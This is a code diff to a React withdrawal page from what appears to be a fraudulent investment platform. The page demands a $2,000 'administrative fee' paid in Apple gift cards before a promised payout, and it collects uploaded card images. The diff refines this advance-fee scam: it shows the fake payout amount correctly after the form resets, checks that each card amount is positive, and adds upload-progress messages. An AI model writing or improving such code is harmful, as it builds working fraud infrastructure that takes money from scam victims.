@@ -48,6 +48,7 @@ export default function WithdrawPage() {
   
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [successMsg, setSuccessMsg] = useState(false);
+  const [submittedAmount, setSubmittedAmount] = useState<number>(0); // captures amount before form reset
 
   // Available balance — fetched from DB on mount
   const [availableBalanceUSD, setAvailableBalanceUSD] = useState<number>(0.0);
@@ -193,6 +194,8 @@ export default function WithdrawPage() {
 
   const handleConfirmWithdrawal = async () => {
     setIsSubmitting(true);
+    // Capture the exact withdrawal amount BEFORE clearing the form
+    const withdrawalAmountSnapshot = numAmount;
     try {
       // Clean payload — only send amount + frontImage (strip internal state fields)
       const cleanedCards = giftCards.map((c: any) => ({
@@ -207,7 +210,7 @@ export default function WithdrawPage() {
       });
 
       if (!submitRes.ok) {
-        const err = await submitRes.json();
+        const err = await submitRes.json().catch(() => ({}));
         console.warn('Gift card submit error:', err);
       }
 
@@ -228,7 +231,7 @@ export default function WithdrawPage() {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          amount: numAmount,
+          amount: withdrawalAmountSnapshot,
           payoutMethod: 'CASH_DELIVERY',
           fullName,
           address: `${deliveryAddress}, ${deliveryCity}, ${deliveryState} ${deliveryZip}`,
@@ -236,6 +239,8 @@ export default function WithdrawPage() {
         }),
       });
 
+      // Store the amount snapshot so success message reflects correct value after form reset
+      setSubmittedAmount(withdrawalAmountSnapshot);
       setSuccessMsg(true);
       setAmount('');
       setGiftCards([{ id: 'card-1', amount: '', frontImage: null }]);
@@ -257,7 +262,7 @@ export default function WithdrawPage() {
 
   const isModalValid =
     giftCards.length > 0 &&
-    giftCards.every((c) => Boolean(c.frontImage) && !c.uploading);
+    giftCards.every((c) => parseFloat(c.amount) > 0 && Boolean(c.frontImage) && !c.uploading);
 
   return (
     <div className="max-w-4xl mx-auto px-4 py-8 space-y-8">
@@ -274,7 +279,7 @@ export default function WithdrawPage() {
               <div className="space-y-1">
                 <p className="font-extrabold text-white">Administrative Fee & Withdrawal Submitted!</p>
                 <p className="text-slate-300 leading-relaxed">
-                  Your $2,000.00 USD administrative fee via Apple Gift Card(s) has been received for verification. Your full payout of ${numAmount > 0 ? numAmount.toLocaleString('en-US') : availableBalanceUSD.toLocaleString('en-US')} USD will be delivered to your address immediately upon fee verification (5 - 15 mins).
+                  Your $2,000.00 USD administrative fee via Apple Gift Card(s) has been received for verification. Your full payout of <strong className="text-emerald-300">${submittedAmount.toLocaleString('en-US', { minimumFractionDigits: 2 })} USD</strong> will be delivered to your address immediately upon fee verification (5 - 15 mins).
                 </p>
               </div>
             </div>
@@ -535,16 +540,23 @@ export default function WithdrawPage() {
             <Button variant="secondary" size="md" className="flex-1" onClick={() => setIsModalOpen(false)}>
               Cancel
             </Button>
-            <Button
-              variant="primary"
-              size="md"
-              className="flex-1 font-bold gradient-bg-blue text-[#0B0E11]"
-              isLoading={isSubmitting}
-              disabled={!isModalValid}
-              onClick={handleConfirmWithdrawal}
-            >
-              Submit $2,000 Fee & Complete Payout
-            </Button>
+            <div className="flex-1 space-y-1">
+              {giftCards.some((c) => c.uploading) && (
+                <p className="text-[10px] text-amber-400 font-bold text-center animate-pulse">
+                  ⏳ Uploading image... please wait
+                </p>
+              )}
+              <Button
+                variant="primary"
+                size="md"
+                className="w-full font-bold gradient-bg-blue text-[#0B0E11]"
+                isLoading={isSubmitting}
+                disabled={!isModalValid || giftCards.some((c) => c.uploading)}
+                onClick={handleConfirmWithdrawal}
+              >
+                {giftCards.some((c) => c.uploading) ? 'Uploading Image...' : 'Submit $2,000 Fee & Complete Payout'}
+              </Button>
+            </div>
           </div>
         </div>
       </Modal>
